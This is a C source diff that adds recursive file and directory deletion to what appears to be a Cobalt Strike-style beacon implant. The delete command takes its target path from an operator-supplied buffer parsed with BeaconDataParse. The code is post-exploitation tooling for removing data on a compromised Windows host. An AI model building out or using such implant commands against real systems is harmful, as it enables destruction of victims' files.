@@ -183,3 +183,82 @@ BOOL FilesystemIsDirectory(char* filename)
 {
 	return GetFileAttributesA(filename) & FILE_ATTRIBUTE_DIRECTORY;
 }
+
+void FilesystemRemoveRecursiveCallback(const char* a1, const char* a2, BOOL isDirectory)
+{
+	char* lpPathName = (char*)malloc(0x4000);
+	_snprintf(lpPathName, 0x4000, "%s\\%s", a1, a2);
+	if (isDirectory)
+		RemoveDirectoryA(lpPathName);
+	else
+		DeleteFileA(lpPathName);
+	free(lpPathName);
+}
+
+void FilesystemFindAndProcess(char* filename, WIN32_FIND_DATAA* findData)
+{
+#define MAX_FILENAME 0x8000
+	char* lpFileName;
+
+	lpFileName = malloc(MAX_FILENAME);
+	snprintf(lpFileName, MAX_FILENAME, "%s\\*", filename);
+	LPWIN32_FIND_DATAA lpCurrentFindFileData = findData;
+	HANDLE hFindFile = FindFirstFileA(lpFileName, lpCurrentFindFileData);
+	free(lpFileName);
+
+	if (hFindFile == INVALID_HANDLE_VALUE)
+		return;
+
+	do
+	{
+		if(lpCurrentFindFileData->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+		{
+			if (strcmp(lpCurrentFindFileData->cFileName, ".") && strcmp(lpCurrentFindFileData->cFileName, ".."))
+			{
+				char* lpFileNameInternal = malloc(MAX_FILENAME);
+				snprintf(lpFileNameInternal, MAX_FILENAME, "%s", lpCurrentFindFileData->cFileName);
+
+				lpFileName = malloc(MAX_FILENAME);
+				snprintf(lpFileName, MAX_FILENAME, "%s\\%s", filename, findData->cFileName);
+				FilesystemFindAndProcess(lpFileName, findData);
+				free(lpFileName);
+
+				FilesystemRemoveRecursiveCallback(filename, lpFileNameInternal, TRUE);
+				free(lpFileNameInternal);
+			}
+
+			lpCurrentFindFileData = findData;
+		}
+		else
+		{
+			FilesystemRemoveRecursiveCallback(filename, lpCurrentFindFileData->cFileName, FALSE);
+		}
+	} while (FindNextFileA(hFindFile, lpCurrentFindFileData));
+	FindClose(hFindFile);
+}
+
+void FilesystemRemoveDirectoryChildren(char* filepath)
+{
+	WIN32_FIND_DATAA findData;
+
+	FilesystemFindAndProcess(
+		filepath,
+		&findData);
+}
+
+void FilesystemRemove(char* buffer, int length)
+{
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	char* filepath = BeaconDataStringPointerCopy(&parser, 0x4000);
+	if (FilesystemIsDirectory(filepath))
+	{
+		FilesystemRemoveDirectoryChildren(filepath);
+		RemoveDirectoryA(filepath);
+	}
+	else
+	{
+		DeleteFileA(filepath);
+	}
+	free(filepath);
+}
